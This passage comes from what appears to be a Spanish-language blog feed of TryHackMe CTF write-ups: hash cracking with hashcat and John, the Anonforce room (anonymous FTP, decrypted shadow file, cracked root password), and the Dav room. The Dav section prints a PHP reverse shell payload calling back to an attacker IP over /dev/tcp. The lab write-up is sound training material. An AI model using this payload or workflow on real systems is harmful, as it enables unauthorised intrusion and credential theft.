for the price of drastically reduced performance. If you want to switch to optimized OpenCL kernels, append -O to your commandline. Watchdog: Temperature abort trigger set to 90c Dictionary cache hit: * Filename..: rockyou.txt * Passwords.: 14344385 * Bytes.....: 139921507 * Keyspace..: 14344385 [s]tatus [p]ause [b]ypass [c]heckpoint [q]uit =\u0026gt; s Session..........: sha512 Status...........: Running Hash.Type........: sha512crypt $6$, SHA512 (Unix) Hash.Target......: $6$aReallyHardSalt$6WKUTqzq.UQQmrm0p/T7MPpMbGNnzXPM...ZAs02. Time.Started.....: Thu Sep 5 18:23:56 2019 (10 mins, 59 secs) Time.Estimated...: Thu Sep 5 19:27:46 2019 (52 mins, 51 secs) Guess.Base.......: File (rockyou.txt) Guess.Queue......: 1/1 (100.00%) Speed.#2.........: 3746 H/s (18.22ms) @ Accel:64 Loops:32 Thr:32 Vec:1 Recovered........: 0/1 (0.00%) Digests, 0/1 (0.00%) Salts Progress.........: 2463744/14344385 (17.18%) Rejected.........: 0/2463744 (0.00%) Restore.Point....: 2463744/14344385 (17.18%) Restore.Sub.#2...: Salt:0 Amplifier:0-1 Iteration:2784-2816 Candidates.#2....: จคภจจ/ภ-ึจ -\u0026gt; zz336649 Hardware.Mon.#2..: Temp: 86c Util: 93% Core:1137MHz Mem:2505MHz Bus:4   Crackeada:\n$6$aReallyHardSalt$6WKUTqzq.UQQmrm0p/T7MPpMbGNnzXPMAXi4bJMl9be.cfi3/qxIf.hsGpS41BqMhSrHVXgMpdjS6xeKZAs02.:waka99\n#4 SHA1 HashInfo:\n1 2  Hash: e5d8870e5bdd26602cab8dbe07a942c8669e56d6 Salt: tryhackme   HASHIDENTIFIER 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36  ------------------------------------------------------------------------- HASH: e5d8870e5bdd26602cab8dbe07a942c8669e56d6 Possible Hashs: [+] SHA-1 [+] MySQL5 - SHA-1(SHA-1($pass)) Least Possible Hashs: [+] Tiger-160 [+] Haval-160 [+] RipeMD-160 [+] SHA-1(HMAC) [+] Tiger-160(HMAC) [+] RipeMD-160(HMAC) [+] Haval-160(HMAC) [+] SHA-1(MaNGOS) [+] SHA-1(MaNGOS2) [+] sha1($pass.$salt) [+] sha1($salt.$pass) [+] sha1($salt.md5($pass)) [+] sha1($salt.md5($pass).$salt) [+] sha1($salt.sha1($pass)) [+] sha1($salt.sha1($salt.sha1($pass))) [+] sha1($username.$pass) [+] sha1($username.$pass.$salt) [+] sha1(md5($pass)) [+] sha1(md5($pass).$salt) [+] sha1(md5(sha1($pass))) [+] sha1(sha1($pass)) [+] sha1(sha1($pass).$salt) [+] sha1(sha1($pass).substr($pass,0,3)) [+] sha1(sha1($salt.$pass)) [+] sha1(sha1(sha1($pass))) [+] sha1(strtolower($username).$pass) -------------------------------------------------------------------------   HASHCAT 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46  sckull@tars:~/tools/hashcat$ ./hashcat64.bin -m 110 ../hash.sha1 ../rockyou.txt hashcat (v5.1.0) starting... * Device #2: WARNING! Kernel exec timeout is not disabled. This may cause \u0026#34;CL_OUT_OF_RESOURCES\u0026#34; or related errors. To disable the timeout, see: https://hashcat.net/q/timeoutpatch nvmlDeviceGetFanSpeed(): Not Supported OpenCL Platform #1: Intel(R) Corporation ======================================== * Device #1: Intel(R) Core(TM) i5-8250U CPU @ 1.60GHz, skipped. OpenCL Platform #2: NVIDIA Corporation ====================================== * Device #2: GeForce MX130, 501/2004 MB allocatable, 3MCU Hashes: 1 digests; 1 unique digests, 1 unique salts Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates Rules: 1 Applicable optimizers: * Zero-Byte * Early-Skip * Not-Iterated * Single-Hash * Single-Salt * Raw-Hash Minimum password length supported by kernel: 0 Maximum password length supported by kernel: 256 Minimim salt length supported by kernel: 0 Maximum salt length supported by kernel: 256 ATTENTION! Pure (unoptimized) OpenCL kernels selected. This enables cracking passwords and salts \u0026gt; length 32 but for the price of drastically reduced performance. If you want to switch to optimized OpenCL kernels, append -O to your commandline. Watchdog: Temperature abort trigger set to 90c Dictionary cache hit: * Filename..: ../rockyou.txt * Passwords.: 14344385 * Bytes.....: 139921507 * Keyspace..: 14344385 [s]tatus [p]ause [b]ypass [c]heckpoint [q]uit =\u0026gt;   Crackeada:\ne5d8870e5bdd26602cab8dbe07a942c8669e56d6:481616481616\n","description":"Crack The Hash es una serie de retos de TryHackMe que presenta diferentes Hashes las cuales identificamos con hash-identifier y Hash-Analyzer, y crackeamos con Hashcat y CrackStation.","id":136,"section":"posts","tags":["hashcat","hash-identifier"],"title":"TryHackMe - Crack The Hash","uri":"https://sckull.github.io/posts/hashes/"},{"content":"Anonforce es una maquina de TryHackMe originalmente para Bsides Guatemala, encontramos un servicio FTP el cual contiene un backup encriptado y su respectiva llave, utilizando John obtuvimos la contraseña, dentro del backup encontramos una copia del archivo /etc/shadow, nuevamente con John obtuvimos la contraseña del usuario root que finalmente nos dio acceso privilegiado.\n Room    Titulo Anonforce      Descripción boot2root machine for FIT and bsides guatemala CTF   Puntos 60   Dificultad Facil   Maker stuxnet     MASSCAN \u0026amp; NMAP Escaneo de puertos udp/tcp y sus servicios.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59  root@kali:~/trymehack/anonforce# masscan -p1-65535,U:1-65535 10.10.176.169 --rate=1000 -e tun0 Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-09-03 22:40:02 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 21/tcp on 10.10.176.169 Discovered open port 22/tcp on 10.10.176.169 # Nmap 7.70 scan initiated Tue Sep 3 18:46:02 2019 as: nmap -sV -sC -p22,21 -o nmap.scan 10.10.176.169 Nmap scan report for 10.10.176.169 Host is up (0.37s latency). PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 | ftp-anon: Anonymous FTP login allowed (FTP code 230) | drwxr-xr-x 2 0 0 4096 Aug 11 17:42 bin | drwxr-xr-x 3 0 0 4096 Aug 11 17:43 boot | drwxr-xr-x 17 0 0 3700 Sep 03 15:39 dev | drwxr-xr-x 85 0 0 4096 Aug 13 13:09 etc | drwxr-xr-x 3 0 0 4096 Aug 11 17:33 home | lrwxrwxrwx 1 0 0 33 Aug 11 17:42 initrd.img -\u0026gt; boot/initrd.img-4.4.0-157-generic | lrwxrwxrwx 1 0 0 33 Aug 11 17:42 initrd.img.old -\u0026gt; boot/initrd.img-4.4.0-142-generic | drwxr-xr-x 19 0 0 4096 Aug 11 17:32 lib | drwxr-xr-x 2 0 0 4096 Aug 11 17:30 lib64 | drwx------ 2 0 0 16384 Aug 11 17:30 lost+found | drwxr-xr-x 4 0 0 4096 Aug 11 17:30 media | drwxr-xr-x 2 0 0 4096 Feb 26 2019 mnt | drwxrwxrwx 2 1000 1000 4096 Aug 11 21:52 notread [NSE: writeable] | drwxr-xr-x 2 0 0 4096 Aug 11 17:34 opt | dr-xr-xr-x 96 0 0 0 Sep 03 15:39 proc | drwx------ 3 0 0 4096 Aug 11 21:22 root | drwxr-xr-x 18 0 0 540 Sep 03 15:39 run | drwxr-xr-x 2 0 0 12288 Aug 11 17:42 sbin | drwxr-xr-x 3 0 0 4096 Aug 11 17:43 srv | dr-xr-xr-x 13 0 0 0 Sep 03 15:39 sys |_Only 20 shown. Use --script-args ftp-anon.maxlist=-1 to see all. | ftp-syst: | STAT: | FTP server status: | Connected to ::ffff:10.8.1.72 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 4 | vsFTPd 3.0.3 - secure, fast, stable |_End of status 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 8a:f9:48:3e:11:a1:aa:fc:b7:86:71:d0:2a:f6:24:e7 (RSA) | 256 73:5d:de:9a:88:6e:64:7a:e1:87:ec:65:ae:11:93:e3 (ECDSA) |_ 256 56:f9:9f:24:f1:52:fc:16:b7:7b:a3:e2:4f:17:b4:ea (ED25519) Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Tue Sep 3 18:46:29 2019 -- 1 IP address (1 host up) scanned in 27.58 seconds   FTP Mediante el puerto 21 de ftp nos logeamos con el usuario y contraseña anonymous, y logramos obtener la flag user.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67  root@kali:~/trymehack/anonforce# ftp 10.10.176.169 Connected to 10.10.176.169. 220 (vsFTPd 3.0.3) Name (10.10.176.169:root): anonymous 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; ls -lah 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxr-xr-x 23 0 0 4096 Aug 11 21:48 . drwxr-xr-x 23 0 0 4096 Aug 11 21:48 .. drwxr-xr-x 2 0 0 4096 Aug 11 17:42 bin drwxr-xr-x 3 0 0 4096 Aug 11 17:43 boot drwxr-xr-x 17 0 0 3700 Sep 03 15:39 dev drwxr-xr-x 85 0 0 4096 Aug 13 13:09 etc drwxr-xr-x 3 0 0 4096 Aug 11 17:33 home lrwxrwxrwx 1 0 0 33 Aug 11 17:42 initrd.img -\u0026gt; boot/initrd.img-4.4.0-157-generic lrwxrwxrwx 1 0 0 33 Aug 11 17:42 initrd.img.old -\u0026gt; boot/initrd.img-4.4.0-142-generic drwxr-xr-x 19 0 0 4096 Aug 11 17:32 lib drwxr-xr-x 2 0 0 4096 Aug 11 17:30 lib64 drwx------ 2 0 0 16384 Aug 11 17:30 lost+found drwxr-xr-x 4 0 0 4096 Aug 11 17:30 media drwxr-xr-x 2 0 0 4096 Feb 26 2019 mnt drwxrwxrwx 2 1000 1000 4096 Aug 11 21:52 notread drwxr-xr-x 2 0 0 4096 Aug 11 17:34 opt dr-xr-xr-x 100 0 0 0 Sep 03 15:39 proc drwx------ 3 0 0 4096 Aug 11 21:22 root drwxr-xr-x 18 0 0 540 Sep 03 15:39 run drwxr-xr-x 2 0 0 12288 Aug 11 17:42 sbin drwxr-xr-x 3 0 0 4096 Aug 11 17:43 srv dr-xr-xr-x 13 0 0 0 Sep 03 15:39 sys drwxrwxrwt 9 0 0 4096 Sep 03 15:39 tmp drwxr-xr-x 10 0 0 4096 Aug 11 17:30 usr drwxr-xr-x 11 0 0 4096 Aug 11 17:30 var lrwxrwxrwx 1 0 0 30 Aug 11 17:42 vmlinuz -\u0026gt; boot/vmlinuz-4.4.0-157-generic lrwxrwxrwx 1 0 0 30 Aug 11 17:42 vmlinuz.old -\u0026gt; boot/vmlinuz-4.4.0-142-generic c226 Directory send OK. ftp\u0026gt; cd home 250 Directory successfully changed. ftp\u0026gt; ls 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxr-xr-x 4 1000 1000 4096 Aug 11 21:22 melodias 226 Directory send OK. ftp\u0026gt; cd melodias 250 Directory successfully changed. ftp\u0026gt; ls 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. -rw-rw-r-- 1 1000 1000 33 Aug 11 21:22 user.txt ls226 Directory send OK. ftp\u0026gt; cat user.txt ?Invalid command ftp\u0026gt; get user.txt local: user.txt remote: user.txt 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for user.txt (33 bytes). 226 Transfer complete. 33 bytes received in 0.00 secs (144.5137 kB/s) ftp\u0026gt; exit 221 Goodbye. root@kali:~/trymehack/anonforce# cat user.txt 606083fd33beb1284fc51f411a706af8 root@kali:~/trymehack/anonforce#   PGP BACKUP Dentro de la carpeta notread encontramos un archivo pgp y una llave asc.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  ftp\u0026gt; cd notread 250 Directory successfully changed. ftp\u0026gt; ls -lah 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxrwxrwx 2 1000 1000 4096 Aug 11 21:52 . drwxr-xr-x 23 0 0 4096 Aug 11 21:48 .. -rwxrwxrwx 1 1000 1000 524 Aug 11 21:49 backup.pgp -rwxrwxrwx 1 1000 1000 3762 Aug 11 21:49 private.asc 226 Directory send OK. ftp\u0026gt; get backup.pgp local: backup.pgp remote: backup.pgp 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for backup.pgp (524 bytes). 226 Transfer complete. 524 bytes received in 0.00 secs (2.2210 MB/s) ftp\u0026gt; get private.asc local: private.asc remote: private.asc 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for private.asc (3762 bytes). 226 Transfer complete. 3762 bytes received in 0.00 secs (8.4417 MB/s) ftp\u0026gt;   Obtenemos la frase del archivo private.asc con gpg2john y con john the ripper.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  root@kali:~/trymehack/anonforce# gpg2john private.asc \u0026gt; hash File private.asc root@kali:~/trymehack/anonforce# john --format=gpg hash --wordlist=/usr/share/wordlists/rockyou.txt Using default input encoding: UTF-8 Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64]) Cost 1 (s2k-count) is 65536 for all loaded hashes Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes Will run 4 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status xbox360 (anonforce) 1g 0:00:00:00 DONE (2019-09-03 18:59) 8.333g/s 7766p/s 7766c/s 7766C/s xbox360..madalina Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed root@kali:~/trymehack/anonforce#   Utilizamos gpg para importar la clave y descencriptar el archivo backup.\nroot@kali:~/trymehack/anonforce# gpg --import private.asc gpg: key B92CD1F280AD82C2: \u0026quot;anonforce \u0026lt;melodias@anonforce.nsa\u0026gt;\u0026quot; not changed gpg: key B92CD1F280AD82C2: secret key imported gpg: key B92CD1F280AD82C2: \u0026quot;anonforce \u0026lt;melodias@anonforce.nsa\u0026gt;\u0026quot; not changed gpg: Total number processed: 2 gpg: unchanged: 2 gpg: secret keys read: 1 gpg: secret keys imported: 1 root@kali:~/trymehack/anonforce# gpg --decrypt file.pgp gpg: can't open 'file.pgp': No such file or directory gpg: decrypt_message failed: No such file or directory root@kali:~/trymehack/anonforce# gpg --decrypt backup.pgp gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences gpg: encrypted with 512-bit ELG key, ID AA6268D1E6612967, created 2019-08-12 \u0026quot;anonforce \u0026lt;melodias@anonforce.nsa\u0026gt;\u0026quot; root:$6$07nYFaYf$F4VMaegmz7dKjsTukBLh6cP01iMmL7CiQDt1ycIm6a.bsOIBp0DwXVb9XI2EtULXJzBtaMZMNd2tV4uob5RVM0:18120:0:99999:7::: daemon:*:17953:0:99999:7::: bin:*:17953:0:99999:7::: sys:*:17953:0:99999:7::: sync:*:17953:0:99999:7::: games:*:17953:0:99999:7::: man:*:17953:0:99999:7::: lp:*:17953:0:99999:7::: mail:*:17953:0:99999:7::: news:*:17953:0:99999:7::: uucp:*:17953:0:99999:7::: proxy:*:17953:0:99999:7::: www-data:*:17953:0:99999:7::: backup:*:17953:0:99999:7::: list:*:17953:0:99999:7::: irc:*:17953:0:99999:7::: gnats:*:17953:0:99999:7::: nobody:*:17953:0:99999:7::: systemd-timesync:*:17953:0:99999:7::: systemd-network:*:17953:0:99999:7::: systemd-resolve:*:17953:0:99999:7::: systemd-bus-proxy:*:17953:0:99999:7::: syslog:*:17953:0:99999:7::: _apt:*:17953:0:99999:7::: messagebus:*:18120:0:99999:7::: uuidd:*:18120:0:99999:7::: melodias:$1$xDhc6S6G$IQHUW5ZtMkBQ5pUMjEQtL1:18120:0:99999:7::: sshd:*:18120:0:99999:7::: ftp:*:18120:0:99999:7::: root@kali:~/trymehack/anonforce# USER - ROOT Utilizamos nuevamente john para crackear las contraseñas.\nroot@kali:~/trymehack/anonforce# john hash2 --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt Using default input encoding: UTF-8 Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x]) Cost 1 (iteration count) is 5000 for all loaded hashes Will run 4 OpenMP threads Press 'q' or Ctrl-C to abort, almost any other key for status hikari (root) 1g 0:00:00:02 DONE (2019-09-03 19:02) 0.4901g/s 3388p/s 3388c/s 3388C/s 98765432..better Use the \u0026quot;--show\u0026quot; option to display all of the cracked passwords reliably Session completed root@kali:~/trymehack/anonforce# Nos logeamos en el servicio de ssh con las credenciales de root y logramos obtener nuestra flag root.txt.\n","description":"Anonforce es una maquina de TryHackMe originalmente para Bsides Guatemala, encontramos un servicio FTP el cual contiene un backup encriptado y su respectiva llave, utilizando John obtuvimos la contraseña, dentro del backup encontramos una copia del archivo /etc/shadow, nuevamente con John obtuvimos la contraseña del usuario root que finalmente nos dio acceso privilegiado.","id":137,"section":"posts","tags":["ftp"],"title":"TryHackMe - Anonforce","uri":"https://sckull.github.io/posts/anonforce/"},{"content":"  Dav es una maquina de TryHackMe originalmente para Bsides Guatemala, encontramos credenciales encriptadas en la pagina web las cuales utilizamos para obtener una shell inversa utilizando Cadaver. Para realizar la lectura de la flag root.txt utilizamos Cat con Sudo.\nRoom    Titulo Dav      Descripción boot2root machine for FIT and bsides guatemala CTF   Puntos 60   Dificultad Facil   Maker stuxnet     MASSCAN \u0026amp; NMAP Escaneo de puertos udp/tcp y sus servicios.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  root@kali:~/trymehack/dav# masscan -p1-65535,U:1-65535 10.10.142.11 --rate=1000 -e tun0 Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-09-03 07:41:09 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 80/tcp on 10.10.142.11 # Nmap 7.70 scan initiated Tue Sep 3 03:45:18 2019 as: nmap -sC -sV -o nmap.scan 10.10.142.11 Nmap scan report for 10.10.142.11 Host is up (0.26s latency). Not shown: 999 closed ports PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Tue Sep 3 03:46:50 2019 -- 1 IP address (1 host up) scanned in 92.13 seconds   WHATWEB HTTP Pagina web en el puerto 80.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  root@kali:~/trymehack/dav# gobuster dir -u 10.10.142.11 -w /usr/share/wordlists/dirb/common.txt -n -x php,html,txt -t 15 =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://10.10.142.11 [+] Threads: 15 [+] Wordlist: /usr/share/wordlists/dirb/common.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Extensions: php,html,txt [+] No status: true [+] Timeout: 10s =============================================================== 2019/09/03 03:49:48 Starting gobuster =============================================================== /index.html /index.html /server-status /webdav =============================================================== 2019/09/03 03:53:38 Finished ===============================================================   WEBDAV Visitamos /webdav e ingresamos las credenciales por default.\n1 2  Username: wampp Password: xampp   Encontramos un archivo con usuario y contraseña.\n1 2  #passwd.dav wampp:$apr1$Wm2VTkFK$PVNRQv7kzqXQIHe14qKA91   Utilizamos hashcat para crackear la contraseña junto con el diccionario rockyou.\n1  hashcat64.bin -m 1600 -o pass.txt dav_hash.txt rockyou.txt --force   SHELL - CADAVER Utilizamos cadaver para poder subir una shell inversa, con las credenciales por default.\n1 2  \u0026lt;?php exec(\u0026#34;/bin/bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/10.0.0.10/1234 0\u0026gt;\u0026amp;1\u0026#39;\u0026#34;);   Visitamos nuestra shell.php logrando ejecutar nuestra shell inversa y obtener acceso con el usuario www-data.\nUSER FLAG Vemos nuestra flag user.txt en la carpeta principal de Merlin.\nPRIVILEGE ESCALATION Hacemos una enumeracion rapida con el comando sudo -l -l, y vemos que podemos ejecutar cat con sudo. Utilizamos cat para obtener nuestra flag root.txt.\n","description":"Dav es una maquina de TryHackMe originalmente para Bsides Guatemala, encontramos credenciales encriptadas en la pagina web las cuales utilizamos para obtener una shell inversa utilizando Cadaver. Para realizar la lectura de la flag root.txt utilizamos Cat con Sudo.","id":138,"section":"posts","tags":["webdav","cadaver"],"title":"TryHackMe - Dav","uri":"https://sckull.github.io/posts/dav/"},{"content":"  Develpy es una maquina de TryHackMe originalmente para Bsides Guatemala, presenta una vulnerabilidad en script de Python a la escucha de instrucciones donde ejecutamos una shell inversa, tambien encontramos un reto de Esteganografia que nos dio acceso a un siguiente usuario por SSH. Para escalar privilegios modificamos un script utilizado por un CronJob, una alternativa era una aplicacion en Django que permitia la ejecucion de scripts en python.\nRoom    Titulo Develpy      Descripción boot2root machine for FIT and bsides Guatemala CTF   Puntos 60   Dificultad Media   Maker stuxnet     MASSCAN \u0026amp; NMAP Escaneo de puertos udp/tcp y sus servicios.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89  root@kali:~/trymehack/develpy# masscan -p1-65535,U:1-65535 10.10.100.133 --rate=1000 -e tun0 Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-09-03 23:20:18 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 10000/tcp on 10.10.100.133 Discovered open port 22/tcp on 10.10.100.133 root@kali:~/trymehack/develpy# nmap --script firewall-bypass 10.10.100.133 Starting Nmap 7.70 ( https://nmap.org ) at 2019-09-03 19:36 EDT Nmap scan report for 10.10.100.133 Host is up (0.16s latency). Not shown: 998 closed ports PORT STATE SERVICE 22/tcp open ssh 10000/tcp open snet-sensor-mgmt Starting Nmap 7.70 ( https://nmap.org ) at 2019-09-03 19:38 EDT Nmap scan report for 10.10.100.133 Host is up (0.19s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) 10000/tcp open snet-sensor-mgmt? | fingerprint-strings: | GenericLines: | Private 0days | Please enther number of exploits to send??: Traceback (most recent call last): | File \u0026#34;./exploit.py\u0026#34;, line 6, in \u0026lt;module\u0026gt; | num_exploits = int(input(\u0026#39; Please enther number of exploits to send??: \u0026#39;)) | File \u0026#34;\u0026lt;string\u0026gt;\u0026#34;, line 0 | SyntaxError: unexpected EOF while parsing | GetRequest: | Private 0days | Please enther number of exploits to send??: Traceback (most recent call last): | File \u0026#34;./exploit.py\u0026#34;, line 6, in \u0026lt;module\u0026gt; | num_exploits = int(input(\u0026#39; Please enther number of exploits to send??: \u0026#39;)) | File \u0026#34;\u0026lt;string\u0026gt;\u0026#34;, line 1, in \u0026lt;module\u0026gt; | NameError: name \u0026#39;GET\u0026#39; is not defined | HTTPOptions, RTSPRequest: | Private 0days | Please enther number of exploits to send??: Traceback (most recent call last): | File \u0026#34;./exploit.py\u0026#34;, line 6, in \u0026lt;module\u0026gt; | num_exploits = int(input(\u0026#39; Please enther number of exploits to send??: \u0026#39;)) | File \u0026#34;\u0026lt;string\u0026gt;\u0026#34;, line 1, in \u0026lt;module\u0026gt; | NameError: name \u0026#39;OPTIONS\u0026#39; is not defined | NULL: | Private 0days |_ Please enther number of exploits to send??: 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port10000-TCP:V=7.70%I=7%D=9/3%Time=5D6EF9B4%P=x86_64-pc-linux-gnu%r(NU SF:LL,48,\u0026#34;\\r\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20Private\\x200days\\r\\n\\r\\n\\x20 SF:Please\\x20enther\\x20number\\x20of\\x20exploits\\x20to\\x20send\\?\\?:\\x20\u0026#34;)%r SF:(GetRequest,136,\u0026#34;\\r\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20Private\\x200days\\r SF:\\n\\r\\n\\x20Please\\x20enther\\x20number\\x20of\\x20exploits\\x20to\\x20send\\?\\ SF:?:\\x20Traceback\\x20\\(most\\x20recent\\x20call\\x20last\\):\\r\\n\\x20\\x20File\\ SF:x20\\\u0026#34;\\./exploit\\.py\\\u0026#34;,\\x20line\\x206,\\x20in\\x20\u0026lt;module\u0026gt;\\r\\n\\x20\\x20\\x20\\ SF:x20num_exploits\\x20=\\x20int\\(input\\(\u0026#39;\\x20Please\\x20enther\\x20number\\x20 SF:of\\x20exploits\\x20to\\x20send\\?\\?:\\x20\u0026#39;\\)\\)\\r\\n\\x20\\x20File\\x20\\\u0026#34;\u0026lt;string SF:\u0026gt;\\\u0026#34;,\\x20line\\x201,\\x20in\\x20\u0026lt;module\u0026gt;\\r\\nNameError:\\x20name\\x20\u0026#39;GET\u0026#39;\\x20 SF:is\\x20not\\x20defined\\r\\n\u0026#34;)%r(HTTPOptions,13A,\u0026#34;\\r\\n\\x20\\x20\\x20\\x20\\x20\\ SF:x20\\x20\\x20Private\\x200days\\r\\n\\r\\n\\x20Please\\x20enther\\x20number\\x20of SF:\\x20exploits\\x20to\\x20send\\?\\?:\\x20Traceback\\x20\\(most\\x20recent\\x20cal SF:l\\x20last\\):\\r\\n\\x20\\x20File\\x20\\\u0026#34;\\./exploit\\.py\\\u0026#34;,\\x20line\\x206,\\x20in SF:\\x20\u0026lt;module\u0026gt;\\r\\n\\x20\\x20\\x20\\x20num_exploits\\x20=\\x20int\\(input\\(\u0026#39;\\x20P SF:lease\\x20enther\\x20number\\x20of\\x20exploits\\x20to\\x20send\\?\\?:\\x20\u0026#39;\\)\\) SF:\\r\\n\\x20\\x20File\\x20\\\u0026#34;\u0026lt;string\u0026gt;\\\u0026#34;,\\x20line\\x201,\\x20in\\x20\u0026lt;module\u0026gt;\\r\\nNa SF:meError:\\x20name\\x20\u0026#39;OPTIONS\u0026#39;\\x20is\\x20not\\x20defined\\r\\n\u0026#34;)%r(RTSPReque SF:st,13A,\u0026#34;\\r\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20Private\\x200days\\r\\n\\r\\n\\x2 SF:0Please\\x20enther\\x20number\\x20of\\x20exploits\\x20to\\x20send\\?\\?:\\x20Tra SF:ceback\\x20\\(most\\x20recent\\x20call\\x20last\\):\\r\\n\\x20\\x20File\\x20\\\u0026#34;\\./e SF:xploit\\.py\\\u0026#34;,\\x20line\\x206,\\x20in\\x20\u0026lt;module\u0026gt;\\r\\n\\x20\\x20\\x20\\x20num_ex SF:ploits\\x20=\\x20int\\(input\\(\u0026#39;\\x20Please\\x20enther\\x20number\\x20of\\x20exp SF:loits\\x20to\\x20send\\?\\?:\\x20\u0026#39;\\)\\)\\r\\n\\x20\\x20File\\x20\\\u0026#34;\u0026lt;string\u0026gt;\\\u0026#34;,\\x20l SF:ine\\x201,\\x20in\\x20\u0026lt;module\u0026gt;\\r\\nNameError:\\x20name\\x20\u0026#39;OPTIONS\u0026#39;\\x20is\\x2 SF:0not\\x20defined\\r\\n\u0026#34;)%r(GenericLines,13B,\u0026#34;\\r\\n\\x20\\x20\\x20\\x20\\x20\\x20\\ SF:x20\\x20Private\\x200days\\r\\n\\r\\n\\x20Please\\x20enther\\x20number\\x20of\\x20 SF:exploits\\x20to\\x20send\\?\\?:\\x20Traceback\\x20\\(most\\x20recent\\x20call\\x2 SF:0last\\):\\r\\n\\x20\\x20File\\x20\\\u0026#34;\\./exploit\\.py\\\u0026#34;,\\x20line\\x206,\\x20in\\x20 SF:\u0026lt;module\u0026gt;\\r\\n\\x20\\x20\\x20\\x20num_exploits\\x20=\\x20int\\(input\\(\u0026#39;\\x20Pleas SF:e\\x20enther\\x20number\\x20of\\x20exploits\\x20to\\x20send\\?\\?:\\x20\u0026#39;\\)\\)\\r\\n SF:\\x20\\x20File\\x20\\\u0026#34;\u0026lt;string\u0026gt;\\\u0026#34;,\\x20line\\x200\\r\\n\\x20\\x20\\x20\\x20\\r\\n\\x20\\ SF:x20\\x20\\x20\\^\\r\\nSyntaxError:\\x20unexpected\\x20EOF\\x20while\\x20parsing\\ SF:r\\n\u0026#34;); Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any 